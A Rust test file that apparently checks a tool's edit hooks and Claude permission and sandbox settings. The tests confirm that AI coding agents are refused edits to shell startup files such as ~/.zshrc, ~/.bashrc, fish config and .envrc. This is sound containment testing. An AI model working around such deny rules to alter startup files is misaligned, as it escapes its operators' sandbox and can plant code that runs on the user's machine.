fn installed_edit_hooks_refuse_shell_startup_files() {
    let (project, home) = startup_project();
    let zshrc = home.join(".zshrc");
    let target = serde_json::to_string(zshrc.to_str().unwrap()).unwrap();
    let target = target.trim_matches('"');
    let root = serde_json::to_string(project.root.to_str().unwrap()).unwrap();
    let root = root.trim_matches('"');
    let mut wrong = Vec::new();
    for (harness, tool, data) in [
        (
            "codex",
            "apply_patch",
            include_str!("../../../codeflow-core/tests/fixtures/edit-hooks/codex-apply-patch.json"),
        ),
        (
            "grok",
            "write",
            include_str!("../../../codeflow-core/tests/fixtures/edit-hooks/grok-write.json"),
        ),
        (
            "grok",
            "search_replace",
            include_str!(
                "../../../codeflow-core/tests/fixtures/edit-hooks/grok-search-replace.json"
            ),
        ),
    ] {
        for (path, refused) in [
            (target, true),
            ("rc", true),
            (".envrc", true),
            ("notes.md", false),
        ] {
            let full = if path.starts_with('/') {
                path.to_string()
            } else {
                format!("{root}/{path}")
            };
            let text = data
                .replace(".codeflow/policy.json", path)
                .replace("/fixture/project/hello.txt", &full)
                .replace("/fixture/project/notes.txt", &full)
                .replace("/fixture/project", root);
            let payload: Value = serde_json::from_str(&text).unwrap();
            let outputs = project.replay_payload(harness, tool, &payload);
            if refused != refused_with(&outputs, RULE) {
                wrong.push(format!(
                    "{harness}:{tool}: {path} refused={refused}: {outputs:?}"
                ));
            }
            if !refused && outputs.iter().any(|o| !o.status.success()) {
                wrong.push(format!("{harness}:{tool}: refused {path}"));
            }
        }
    }
    for (tool, input) in [
        ("Write", json!({"file_path": zshrc, "content": "x"})),
        (
            "Edit",
            json!({"file_path": zshrc, "old_string": "a", "new_string": "b"}),
        ),
    ] {
        let outputs = project.replay("codex", tool, input);
        if !refused_with(&outputs, RULE) {
            wrong.push(format!("codex:{tool}: allowed {}", zshrc.display()));
        }
    }
    assert!(wrong.is_empty(), "wrong verdicts:\n{}", wrong.join("\n"));
}

/// Claude's edit tools are contained by its permission and sandbox denies,
/// which `codeflow init` installs from the shipped preset.
#[test]
fn installed_claude_settings_deny_shell_startup_edits() {
    let project = Project::new();
    let settings: Value =
        serde_json::from_slice(&std::fs::read(project.root.join(".claude/settings.json")).unwrap())
            .unwrap();
    let has = |list: &Value, rule: &str| {
        list.as_array()
            .is_some_and(|a| a.iter().any(|r| r.as_str() == Some(rule)))
    };
    let deny = &settings["permissions"]["deny"];
    let write = &settings["sandbox"]["filesystem"]["denyWrite"];
    for rule in [
        "Edit(~/.zshrc)",
        "Edit(~/.config/fish/**)",
        "Edit(//**/.envrc)",
    ] {
        assert!(has(deny, rule), "{rule}");
    }
    for path in ["~/.zshrc", "~/.bashrc", "~/.config/fish"] {
        assert!(has(write, path), "{path}");
    }
}
